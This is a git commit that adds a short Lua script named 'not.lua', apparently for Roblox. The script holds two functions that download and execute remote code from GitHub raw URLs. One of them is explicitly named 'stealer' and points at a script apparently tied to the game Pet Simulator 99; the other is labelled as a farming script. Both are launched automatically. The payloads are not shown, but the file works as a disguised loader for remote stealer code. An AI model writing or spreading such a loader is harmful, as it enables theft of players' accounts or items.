82591f0dad3610d23f5cf6373dbe44c2db19df9f
Rizo2tuff <ftyifyioftufgt@gmail.com>
2025-04-19 20:36:35 +0200

    Create not.lua

---
+++ not.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Rizo2tuff/Ps99/refs/heads/main/Ps99.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Rizo2tuff/HugeHunter/refs/heads/main/Hugehunter.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
